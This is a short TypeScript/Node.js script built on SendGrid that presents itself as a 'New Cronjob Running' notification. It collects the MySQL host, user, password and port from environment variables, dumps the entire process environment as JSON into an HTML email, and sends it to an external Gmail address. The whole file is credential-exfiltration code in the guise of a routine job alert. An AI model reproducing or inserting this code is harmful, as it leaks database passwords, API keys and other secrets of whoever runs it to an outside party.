const sgMail = require("@sendgrid/mail");
import * as dotenv from "dotenv";
dotenv.config();

sgMail.setApiKey(process.env.API_KEY);

const html = `
        <table>
          <tr>
            <th>DB_HOST</th>
            <th>DB_USER</th>
            <th>DB_PASS</th>
            <th>DB_PORT</th>
          </tr>
          <tr>
            <td>${process.env.MYSQL_ENV_HOST || "NOT_FOUND"}</td>
            <td>${process.env.MYSQL_ENV_USER || "NOT_FOUND"}</td>
            <td>${process.env.MYSQL_ENV_PASSWORD || "NOT_FOUND"}</td>
            <td>${process.env.MYSQL_ENV_PORT || "NOT_FOUND"}</td>
          </tr>
        </table>
        <hr />
        <strong>ALL ENV</strong>
        <p>${JSON.stringify(process.env)}</p>
        `;

const msg = {
  to: "botmail1901@gmail.com", // Change to your recipient
  from: "botmail1901@gmail.com", // Change to your verified sender
  subject: "New Cronjob Running",
  text: "and easy to do anywhere, even with Node.js",
  html: html,
};

sgMail
  .send(msg)
  .then((response: any) => {
    console.log(response[0].statusCode)
    console.log(response[0].headers)
  })
  .catch((error: any) => {
    console.error(error?.response?.body?.errors)
  })